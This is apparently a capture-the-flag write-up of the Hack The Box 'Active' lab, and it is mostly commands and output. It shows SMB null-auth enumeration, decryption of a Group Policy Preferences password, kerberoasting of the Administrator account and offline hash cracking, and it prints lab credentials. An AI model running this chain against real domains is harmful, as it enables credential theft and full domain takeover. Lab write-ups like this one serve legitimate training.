# Active

## Enumeration

Starting with an nmap scan to identify open ports:

```bash
rota@mint:~$ nmap -p- --min-rate 5000 -oN enum/scans/ports.txt 10.129.6.55 
```
```text
PORT      STATE SERVICE
53/tcp    open  domain
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3269/tcp  open  globalcatLDAPssl
5722/tcp  open  msdfsr
49152/tcp open  unknown
49154/tcp open  unknown
49157/tcp open  unknown
49173/tcp open  unknown
```

Followed by a service/script scan to enumerate the services of the open ports:

```bash
rota@mint:~$ nmap -p 53,135,139,445,593,636,3269,5722,49152,49154,49157,49173 --min-rate 5000 -sV -sC -oN enum/scans/svc.txt 10.129.6.55
```
```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
49152/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49173/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
|_clock-skew: 1d00h03m37s
| smb2-time: 
|   date: 2026-09-05T01:40:26
|_  start_date: 2026-09-05T01:34:10
```

This host is running Windows Server 2008, with open SMB, LDAP, and RPC ports.
Also open is port 3268 which is the Global Catalogue port, implying this host is likely a domain controller. This is interesting as port 88 (Kerberos) hasn't made an appearance. There has also been no mention of a Hostname or DC name thus far so I'll be keeping an eye out for one.
DNS is also open which is good to keep note of, however, for now I'll start with enumerating SMB as it often contains low hanging fruit when misconfigured.


## SMB

My first step with SMB is confirming any form of null or anonymous auth. To do this I'll use NetExec:
Command:
```bash
rota@mint:~$ nxc smb 10.129.7.43 -u '' -p ''
```
```text
SMB         10.129.7.43     445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.129.7.43     445    DC               [+] active.htb\:
```

This output is incredibly valuable as it confirms null auth capabilities and tells me the domain name: `active.htb`.

I'll add the domain name to my hosts file and attempt to authenticate with the Guest account as well - sometimes this account will have more permissions than the anonymous user:
```bash
rota@mint:~$ nxc smb 10.129.7.43 -u 'Guest' -p ''
```
```text
SMB         10.129.7.43     445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.129.7.43     445    DC               [-] active.htb\Guest: STATUS_ACCOUNT_DISABLED
```

The account is disabled which is good security practice but not helpful for me.

Using the null auth, I'll enumerate the shares available:
```bash
rota@mint:~$ nxc smb 10.129.7.43 -u '' -p '' --shares
```
```text
SMB         10.129.7.43     445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.129.7.43     445    DC               [+] active.htb\: 
SMB         10.129.7.43     445    DC               [*] Enumerated shares
SMB         10.129.7.43     445    DC               Share           Permissions            Remark
SMB         10.129.7.43     445    DC               -----           -----------            ------
SMB         10.129.7.43     445    DC               ADMIN$                                 Remote Admin
SMB         10.129.7.43     445    DC               C$                                     Default share
SMB         10.129.7.43     445    DC               IPC$                                   Remote IPC
SMB         10.129.7.43     445    DC               NETLOGON                               Logon server share 
SMB         10.129.7.43     445    DC               Replication     READ                   
SMB         10.129.7.43     445    DC               SYSVOL                                 Logon server share 
SMB         10.129.7.43     445    DC               Users
```
The only share I have access to is `Replication`.

### Credential Harvesting

There are multiple ways to enumerate this share - this time I'll be using the NetExec's built in spider_plus module with the specification of the Replication share. This saves the entire file structure to an output file we can review quickly for any interesting names without saving the files locally.
```bash
rota@mint:~$ nxc smb 10.129.7.43 -u '' -p '' -M spider_plus -o share=Replication
```
```text
SMB         10.129.7.43     445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.129.7.43     445    DC               [+] active.htb\: 
SPIDER_PLUS 10.129.7.43     445    DC               [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.129.7.43     445    DC               [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.129.7.43     445    DC               [*]     STATS_FLAG: True
SPIDER_PLUS 10.129.7.43     445    DC               [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.129.7.43     445    DC               [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.129.7.43     445    DC               [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.129.7.43     445    DC               [*]  OUTPUT_FOLDER: /home/rota/.nxc/modules/nxc_spider_plus
SMB         10.129.7.43     445    DC               [*] Enumerated shares
```

In the saved output, one file sticks out:
```text
{
    "Replication": {
        "active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml": {
            "atime_epoch": "2018-07-21 20:37:44",
            "ctime_epoch": "2018-07-21 20:37:44",
            "mtime_epoch": "2018-07-21 20:38:11",
            "size": "533 B"
        },
<snip>
```

To stay continuous with the NetExec theme, I'll download it using the --get-file functionality and saving it to `groups.txt`:
```bash
rota@mint:~$ nxc smb 10.129.7.43 -u '' -p '' --get-file '/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml' groups.txt --share Replication
```
```text
SMB         10.129.7.43     445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.129.7.43     445    DC               [+] active.htb\:
SMB         10.129.7.43     445    DC               [*] Copying "/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml" to "groups.txt"
SMB         10.129.7.43     445    DC               [+] File "/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml" was downloaded to "groups.txt"
```

and inside I find...
```text
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

A password! Albeit, encrypted but still great for me.

## Password Cracking

The next step is to identify the encryption type, which should be relatively easy given the nature of the file. From the parent directories and filename I'm confident in guessing it'll be GPP encrypted - the cpassword attribute also points towards this being true.

To test this I'll use gpp-decrypt, a tool developed by t0thkr1s for this exact purpose:
```bash
rota@mint:~$ gpp-decrypt -f groups.txt 
```
```text
═══ Credential #1 ═══
[ • ] Type: User Account
[ • ] Username: active.htb\SVC_TGS
[ ✓ ] Password: GPPstillStandingStrong2k18
```

And there are the credentials!
`SVC_TGS:GPPstillStandingStrong2k18`

## Local Enumeration

Now I want to know what access SVC_TGS has across the environment.

Again, with NetExec, I'll test authentication across SMB, LDAP, and WINRM (just in case).
Everything returns as expected, with SMB and LDAP auth being allowed and WinRM returning exactly nothing.

Since I don't have direct access to an interactive remote shell, my next step is to have a look at what we can extract for bloodhound.
I'll grab a .zip file using the bloodhound module in NetExec and have a look through the options to attempt privilege escalation.

First to collect the data:
(forgot the `--dns-server` flag the first time... A mistake to learn from!)
```bash
rota@mint:~$ nxc ldap active.htb -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --bloodhound -c All --dns-server 10.129.7.43
```
```text
LDAP        10.129.7.43     389    DC               [*] Windows 7 / Server 2008 R2 Build 7601 (name:DC) (domain:active.htb) (signing:None) (channel binding:No TLS cert) 
LDAP        10.129.7.43     389    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
LDAP        10.129.7.43     389    DC               Resolved collection methods: acl, adcs, container, dcom, group, localadmin, loggedon, objectprops, psremote, rdp, session, trusts
LDAP        10.129.7.43     389    DC               Excluded collection methods: 
LDAP        10.129.7.43     389    DC               Bloodhound data collection completed in 0M 40S
LDAP        10.129.7.43     389    DC               Collecting ADCS data (CertiHound)...
LDAP        10.129.7.43     389    DC               Found 0 certificate templates
LDAP        10.129.7.43     389    DC               Found 0 Enterprise CAs
LDAP        10.129.7.43     389    DC               Compressing output into /home/rota/.nxc/logs/DC_10.129.7.43_2026-09-08_195913_bloodhound.zip
```

Secondly, I'll open up bloodhound and take a look at what access the SVC_TGS user has.

With bloodhound up and running, I see that this account is a part of the `Domain Users` group, which may imply that it's possible to kerberoast our way to a new user.

## Privilege Escalation

In order for kerberoasting to be viable, I'll need:
A valid domain user account - SVC_TGS, as proven in bloodhound.
A connection to the domain controller - In this case the target is a DC.
And a target account with a registered SPN - In this case, the attempt will reveal if this is true.

## Attempt #1

I'll test this with `GetUserSPNs.py` without making a request yet in an attempt to identify possible kerberoastable accounts:
```bash
rota@mint:~$ GetUserSPNs.py 'active.htb/SVC_TGS:GPPstillStandingStrong2k18'
```
```text
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies                                                                                                    
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation        
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------        
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-19 05:06:40.351723  2026-09-08 16:47:17.758945
```

To my surprise, Administrator is the only account returned... (generally Administrator wouldn't appear at all, especially not as the only one)

Now I'll try to request the ticket:
```bash
rota@mint:~$ GetUserSPNs.py 'active.htb/SVC_TGS:GPPstillStandingStrong2k18' -request
```
```text
[-] CCache file is not found. Skipping...
[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great
```

Hah... A clock skew error... I'll fix this quickly with ntpdate and try again:
```bash
rota@mint:~$ GetUserSPNs.py 'active.htb/SVC_TGS:GPPstillStandingStrong2k18' -request
```
```text
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$e0fa8414e26c896edf866632da7de212$6383ead1bc<SNIP>
```

And I get the hash!

## Hash Cracking

Adding the hash to a file, I'll attempt to crack it with hashcat:
```bash
rota@mint:~$ hashcat -m 13100 hash.txt rockyou.txt
```
```text
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$e0fa8414e26c896edf866632da7de212$6383ead1bc<snip>
:Ticketmaster1968
```

Luckily, the first krb5 mode I guessed was right and I get a password!
`Administrator:Ticketmaster1968`

From here I'll confirm smb access to the C$ share we saw earlier:
```bash
rota@mint:~$ nxc smb active.htb -u 'Administrator' -p Ticketmaster1968 --shares
```
```text
SMB         10.129.7.43     445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.129.7.43     445    DC               [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)
SMB         10.129.7.43     445    DC               [*] Enumerated shares
SMB         10.129.7.43     445    DC               Share           Permissions            Remark
SMB         10.129.7.43     445    DC               -----           -----------            ------
SMB         10.129.7.43     445    DC               ADMIN$          READ,WRITE             Remote Admin
SMB         10.129.7.43     445    DC               C$              READ,WRITE             Default share
SMB         10.129.7.43     445    DC               IPC$                                   Remote IPC
SMB         10.129.7.43     445    DC               NETLOGON        READ,WRITE             Logon server share 
SMB         10.129.7.43     445    DC               Replication     READ,WRITE (ACL)       
SMB         10.129.7.43     445    DC               SYSVOL          READ,WRITE             Logon server share 
SMB         10.129.7.43     445    DC               Users           READ,WRITE (ACL)
```

And from here I can either repeat the spider_plus process or use smbclient to download the flag(s) for the sake of the lab.

# Notes
This is effectively domain compromise. With no WinRM it makes the process for getting an interactive shell beyond the requirements of the flags, though I'm hoping in the near future I'm met with a lab that requires something like this. If not I may come back here to document my process on how I would attempt it, although having the Admin credentials makes it relatively easy...
